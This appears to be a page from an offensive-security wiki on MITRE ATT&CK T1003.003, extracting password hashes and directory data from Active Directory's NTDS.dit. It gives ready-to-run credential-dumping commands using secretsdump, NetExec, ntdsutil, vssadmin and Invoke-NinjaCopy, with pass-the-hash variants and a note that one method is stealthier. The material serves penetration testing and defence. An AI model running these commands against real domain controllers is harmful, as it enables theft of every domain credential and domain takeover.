---
description: MITRE ATT&CK™ Sub-technique T1003.003
---

# NTDS secrets

## Theory

NTDS (Windows NT Directory Services) is the directory services used by Microsoft Windows NT to locate, manage, and organize network resources. The NTDS.dit file is a database that stores the Active Directory data (including users, groups, security descriptors and password hashes). This file is stored on the domain controllers.

Once the secrets are extracted, they can be used for various attacks: [credential spraying](../../../../../ad/movement/credentials/bruteforcing/password-spraying.md), [stuffing](../../../../../ad/movement/credentials/bruteforcing/stuffing.md), [shuffling](../../../../../ad/movement/credentials/credential-shuffling.md), [cracking](../../../../../ad/movement/credentials/cracking.md), [pass-the-hash](broken-reference), [overpass-the-hash](../../../../../ad/movement/kerberos/ptk.md) or [silver or golden tickets](../../../../../ad/movement/kerberos/forged-tickets.md).

## Practice

Since the NTDS.dit is constantly used by AD processes such as the Kerberos KDC, it can't be copied like any other file. In order to exfiltrate it from a live domain controller and extract password hashes from it, many techniques can be used.

Just like with [SAM & LSA secrets](broken-reference), the SYSTEM registry hive contains enough info to decrypt the NTDS.dit data. The hive file (`\system32\config\system`) can either be exfiltrated the same way the NTDS.dit file is, or it can be exported with `reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save'`.

{% tabs %}
{% tab title="UNIX-Like" %}
### Secretsdump.py

[Impacket](https://github.com/SecureAuthCorp/impacket)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python) can be used to remotely dump NTDS.dit through Volume Shadow Copy. Several authentication methods can be used like [pass-the-hash](../../../../../ad/movement/ntlm/pth.md) (LM/NTLM), or [pass-the-ticket](../../../../../ad/movement/kerberos/ptt.md) (Kerberos).

```bash
# Remote dumping of NTDS.dit using Shadow Copy
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET' -use-vss -just-dc

# Remote dumping of NTDS.dit using Shadow Copy (pass-the-hash)
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@DC_TARGET' -use-vss -just-dc

# Remote dumping of NTDS.dit using Shadow Copy
secretsdump.py -k -no-pass 'DOMAIN/USER@DC_TARGET' -use-vss -just-dc

# Offline dumping of NTDS.dit secrets from exported files/hives
secretsdump.py -system '/path/to/system.save' -ntds ntds.dit.save LOCAL
```

### NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can also be used to remotely dump NTDS.dit through Volume Shadow Copy or NTDSUtil. It offers several authentication methods like [pass-the-hash](../../../../../ad/movement/ntlm/pth.md) (NTLM), or [pass-the-ticket](../../../../../ad/movement/kerberos/ptt.md) (Kerberos)

```bash
### Shadow Copy
# Remote dumping of NTDS.dit using Shadow Copy
netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --ntds vss

# Remote dumping of NTDS.dit using Shadow Copy (pass-the-hash)
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --ntds vss

# Remote dumping of NTDS.dit using Shadow Copy (pass-the-ticket)
netexec smb $TARGETS -k --use-kcache --ntds vss

### NTDSUtil
# Remote dumping of NTDS.dit using NTDSUtil
netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD -M ntdsutil

# Remote dumping of NTDS.dit using NTDSUtil (pass-the-hash)
netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M ntdsutil

# Remote dumping of NTDS.dit using NTDSUtil (pass-the-ticket)
netexec smb $TARGETS -k --use-kcache -M ntdsutil
```

{% hint style="success" %}
In addition when using **NetExec** or **Secretsdump**, the `-exec-method` option can be set to `smbexec`, `wmiexec` or `mmcexec` to specify the remote command execution method on which the process should rely.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
### AD maintenance (NTDSUtil)

NTDSUtil.exe is a diagnostic tool available as part of Active Directory. It has the ability to save a snapshot of the Active Directory data. Running the following command will copy the NTDS.dit database and the SYSTEM and SECURITY hives to `C:\Windows\Temp`.

```bash
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
```

The following files can then be exported

* `C:\Windows\Temp\NTDS\Active Directory\ntds.dit`
* `C:\Windows\Temp\NTDS\registry\SYSTEM`

{% hint style="warning" %}
If the NTDS database is very large (several gigabytes), the generation of a defragmented backup with ntdsutil consumes a lot of CPU and disk resources on the server, which can cause slowdowns and other undesirable effects on the domain controller.
{% endhint %}

### Volume Shadow Copy (VSSAdmin)

VSS (Volume Shadow Copy) is a Microsoft Windows technology, implemented as a service, that allows the creation of backup copies of files or volumes, even when they are in use. The following command will create the shadow copy and will print two values that will be used later: the ID and the Name of the shadow copy.

```bash
vssadmin create shadow /for=C:
```

Once the VSS is created for the target drive, it is then possible to copy the target files from it.

```bash
copy $ShadowCopyName\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.save
copy $ShadowCopyName\Windows\System32\config\SYSTEM C:\Windows\Temp\system.save
```

Once the required files are exfiltrated, the shadow copy can be removed

```bash
vssadmin delete shadows /shadow=$ShadowCopyId
```

### Invoke-NinjaCopy

[Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) is a PowerShell script part of the PowerSploit suite able to "copy files off an NTFS volume by opening a read handle to the entire volume (such as c:) and parsing the NTFS structures. **This technique is stealthier than the others.**

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\ntds.dit.save"
```
{% endtab %}

{% tab title="NTDS Parsing" %}
## Secrets dump

Once the required files are exfiltrated, they can be parsed by tools like [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python, part of [Impacket](https://github.com/SecureAuthCorp/impacket/)) or [gosecretsdump](https://github.com/c-sto/gosecretsdump) (Go, faster for big files).

```bash
secretsdump -ntds ntds.dit.save -system system.save LOCAL
gosecretsdump -ntds ntds.dit.save -system system.save
```

### NTDS Directory parsing and extraction

With the required files, it is possible to extract more information than just secrets. The NTDS file is responsible for storing the entire directory, with users, groups, OUs, trusted domains etc... This data can be retrieved by parsing the NTDS with tools like [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). With the NTDS alone, objects can be extracted from the NTDS such as user and machine accounts, with a lot of information about them: descriptions, user account control flags, last logon and password change timestamps etc. This information is stored as an SQLite database which is easier to browse and query.

With the `SYSTEM` hive available it is able to extract credentials as well: NT and LM hashes, supplemental credentials such as kerberos keys, cleartext passwords and password hash history.

```bash
ntdsdotsqlite ntds.dit -o ntds.sqlite
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds" %}
